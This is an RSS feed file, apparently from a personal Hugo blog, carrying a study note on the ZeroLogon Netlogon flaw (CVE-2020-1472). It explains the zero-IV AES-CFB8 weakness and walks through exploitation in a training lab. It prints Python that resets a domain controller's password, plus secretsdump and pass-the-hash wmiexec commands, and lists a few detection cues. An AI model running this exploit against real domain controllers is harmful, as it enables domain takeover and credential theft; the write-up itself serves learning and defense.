@@ -1,0 +1,175 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Notes on Vlaghe&#39;s Blog</title>
+    <link>https://vlaghe.github.io/notes/</link>
+    <description>Recent content in Notes on Vlaghe&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 03 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://vlaghe.github.io/notes/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ZeroLogon</title>
+      <link>https://vlaghe.github.io/notes/zerologon/</link>
+      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://vlaghe.github.io/notes/zerologon/</guid>
+      <description>NetLogon Protocol  Overview  is an RPC interface (Windows domain controllers) used 4 user and machine authentication (e.g logging in to servers using NTLM, update password) available over TCP through a dynamic port set by the portmapper service OR through an SMB pipe on 445 it uses a customized cryptographic protocol to let a client (a domain-joined computer) and server (the domain controller) prove to each other that they both know a shared secret (i.</description>
+      <content>&lt;h2 id=&#34;netlogon-protocol&#34;&gt;NetLogon Protocol&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Overview&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;is an RPC interface &lt;em&gt;(Windows domain controllers)&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;used 4 user and machine authentication &lt;em&gt;(e.g logging in to servers using NTLM, update password)&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;available over TCP through a dynamic port set by the &lt;em&gt;portmapper&lt;/em&gt; service OR through an SMB pipe on &lt;code&gt;445&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;it uses a customized cryptographic protocol to let a client &lt;em&gt;(a domain-joined computer)&lt;/em&gt; and server &lt;em&gt;(the domain controller)&lt;/em&gt; prove to each other that they both know a shared secret &lt;em&gt;(i.e hash of the client&amp;rsquo;s account password)&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;initial auth handshake
+&lt;ul&gt;
+&lt;li&gt;&lt;img src=&#34;https://vlaghe.github.io/img/auth_handshake_zerologon.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;aes-cfb8-insecure-use&#34;&gt;AES-CFB8 insecure use&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;The cryptographic primitive both the client and server use to generate credential values is implemented in a function called &lt;code&gt;ComputeNetlogonCredential&lt;/code&gt; &lt;em&gt;(takes an 8-byte input &amp;amp; performs transformasion w the secret esssion key)&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;To acomplish this it uses the &lt;a href=&#34;https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CFB&#34;&gt;CFB8 (8-bit cypher feedback) mode&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;img src=&#34;https://vlaghe.github.io/img/aes_cfb8.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Instead of generating the Initialization Vector &lt;em&gt;(IV)&lt;/em&gt; randomly, the &lt;code&gt;ComputeNetlogonCredential&lt;/code&gt; function &lt;strong&gt;defines it as a fixed value which consits of 16 zero bytes&lt;/strong&gt; =&amp;gt; this violates the requirments for using AES-CFB8 securely&lt;/li&gt;
+&lt;li&gt;Ok but what could go wrong? Well: &lt;strong&gt;for 1 in 256 keys, applying AESCFB8 encryption to an all-zero plaintext will result in all-zero ciphertext&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;img src=&#34;https://vlaghe.github.io/img/aes_cfb8_broken.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://vlaghe.github.io/img/exploit_zerologon.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Spoofing the client credential
+&lt;ul&gt;
+&lt;li&gt;after exchanging challenges with a &lt;code&gt;NetrServerReqChallenge&lt;/code&gt; call&lt;/li&gt;
+&lt;li&gt;a client authenticates by doing a &lt;code&gt;NetrServerAuthenticate3&lt;/code&gt; call, which has a parameter &lt;code&gt;ClientCredential&lt;/code&gt; &lt;em&gt;(that is computed by applying the &lt;code&gt;ComputeNetlogonCredential&lt;/code&gt; to the client challenge)&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;because we have control over the client challenge there&amp;rsquo;s nothing stopping us to set it to 8 zeroes =&amp;gt; for 1 in 256 session keys, the correct &lt;code&gt;ClientCredential&lt;/code&gt; will also consist of 8 zeroes&lt;/li&gt;
+&lt;li&gt;session key will be different for every authentication attempt&lt;/li&gt;
+&lt;li&gt;computer accounts are not locked after invalid login attempt =&amp;gt; we can try a bunch of times until we hit a key &amp;amp; authentication succeeds&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Disabling signing &amp;amp; sealing
+&lt;ul&gt;
+&lt;li&gt;ok we can bypass the auth call, but we still have no idea what the value of the session key is&lt;/li&gt;
+&lt;li&gt;it becomess problematic due to Netlogon&amp;rsquo;ss transport encryption mechanism &lt;em&gt;(RPC signing &amp;amp; sealing)&lt;/em&gt;, which uses this key but a different scheme than &lt;code&gt;ComputeNetlogonCredential&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;luckily, signing &amp;amp; sealing is optional =&amp;gt; so we can simply omit the flag in the &lt;code&gt;NetrServerAuthenticate3&lt;/code&gt; call &amp;amp; continue&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Spoofing a call
+&lt;ul&gt;
+&lt;li&gt;even when encryption is disabled, every call must contain a so-called &lt;code&gt;authenticator&lt;/code&gt; value which is computed by applying &lt;code&gt;ComputeNetlogonCredential(w session key)&lt;/code&gt; to the &lt;code&gt;ClientStoredCredential + Timestamp&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ClientStoredCredential&lt;/code&gt;: incrementing value maintained by the client &amp;amp; intialised to the same value as the &lt;code&gt;ClientCredential&lt;/code&gt; we provided =&amp;gt; will be 0&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Timestamp&lt;/code&gt;: the current Posix time; server doesn&amp;rsquo;t place many restriction on this value =&amp;gt; simply pretend that it’s January 1st, 1970 = 0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ComputeNetlogonCredential(0) = 0&lt;/code&gt; =&amp;gt; we can authenticate our first call by simply providing an all-zero authenticator &amp;amp; timestamp&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Changing computer&amp;rsquo;s AD password
+&lt;ul&gt;
+&lt;li&gt;we can leverage the &lt;code&gt;NetrServerPasswordSet2&lt;/code&gt; call to set a new password for the client
+&lt;ul&gt;
+&lt;li&gt;password is not hashed but it is encrypted with the session key by using again &lt;code&gt;CFB8&lt;/code&gt; with an all-zero IV&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;plaintext password structure in the Netlogon protocol consists of 516 bytes &lt;em&gt;(last 4 being the pass len)&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;provide 516 zeroes =&amp;gt; decryption to 516 zeroes =&amp;gt; zero-length password &lt;em&gt;(setting empty passwords for a computer is not forbidden)&lt;/em&gt; =&amp;gt; can set an empty password for any computer in the domain&lt;/li&gt;
+&lt;li&gt;afterwards, we can simply set up a new Netlogon connection on behalf of this computer&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: When changing a computer password in this way it is only changed in the AD. The targeted system itself will still locally store its original password.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;From pass change to domain admin&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;lab&#34;&gt;Lab&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Perequistes&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;check out the &lt;a href=&#34;https://github.com/SecuraBV/CVE-2020-1472&#34;&gt;POC released by secura&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;install &lt;a href=&#34;&#34;&gt;impacket&lt;/a&gt;:
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m pip install virtualenv
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m virtualenv impacketEnv  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;source impacketEnv/bin/activate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip install git+https://github.com/SecureAuthCorp/impacket
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;setup a local Domain Name Controller &lt;em&gt;(&lt;a href=&#34;https://tryhackme.com/room/zer0logon&#34;&gt;THM zer0logon room&lt;/a&gt;)&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Modify &lt;code&gt;zerologon_tester.py&lt;/code&gt; to reset the domain controller password &amp;amp; run it: &lt;code&gt;python zerologon_tester.py DC01 10.10.45.187&lt;/code&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;build_new_pass_req&lt;/span&gt;(dc_handle, target_computer):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nrpc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NetrServerPasswordSet2()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PrimaryName&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dc_handle &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AccountName&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; target_computer &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SecureChannelType&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nrpc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NETLOGON_SECURE_CHANNEL_TYPE&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ServerSecureChannel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ComputerName&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; target_computer &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nrpc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NETLOGON_AUTHENTICATOR()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auth[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Credential&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auth[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Timestamp&amp;#39;&lt;/span&gt;]  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Authenticator&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; auth
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# consists of 516 bytes of random padding: junk + password + length of pass (last 4 bytes)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ClearNewPassword&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;516&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; newPassRequest
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;try_zero_authenticate&lt;/span&gt;(dc_handle, dc_ip, target_computer):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# It worked!&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; server_auth[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ErrorCode&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	server_auth&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;server challenge &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;serverChall&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	&lt;span style=&#34;color:#75715e&#34;&gt;# Trigger password reset&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attempting password reset on &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;target_computer&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;...&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		newPassReq &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; build_new_pass_req(dc_handle, target_computer)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		res        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rpc_con&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;request(newPassReq)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	print(e)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; rpc_con
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;Dump hashes with &lt;a href=&#34;https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py&#34;&gt;impacket&amp;rsquo;s secretsdump.py&lt;/a&gt;: &lt;code&gt;python secretsdump.py -just-dc HOLOLIVE/DC01\$@10.10.45.187&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Pop shell w &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py&#34;&gt;wmiexec.py&lt;/a&gt; by passing the hash: &lt;code&gt;python wmiexec.py HOLOLIVE/Administrator@10.10.45.187 -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;packet-analysis&#34;&gt;Packet Analysis&lt;/h2&gt;
+&lt;p&gt;TODO&lt;/p&gt;
+&lt;h2 id=&#34;mitigation--detection&#34;&gt;Mitigation &amp;amp; Detection&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;many tries to authenticate unssuccessfully&lt;/li&gt;
+&lt;li&gt;zero key stream in auth netlogon pkgs&lt;/li&gt;
+&lt;li&gt;ssign &amp;amp; sseal flags are disabled&lt;/li&gt;
+&lt;li&gt;timesstamp in auth value is 0&lt;/li&gt;
+&lt;li&gt;choosing cipher suite of AES-CFB8&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;wirehark rule to detect it &lt;em&gt;(based on timestamp, negotiation opts, challenge &amp;amp; iv?)&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/&#34;&gt;Zerologon (CVE-2020-1472): An Unauthenticated Privilege Escalation to Full Domain Privileges&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=EzVmGQr2IFw&#34;&gt;Zerologon Attack Explained Technical - CVE-2020-1472&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.secura.com/uploads/whitepapers/Zerologon.pdf&#34;&gt;Whitepaper: secura&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
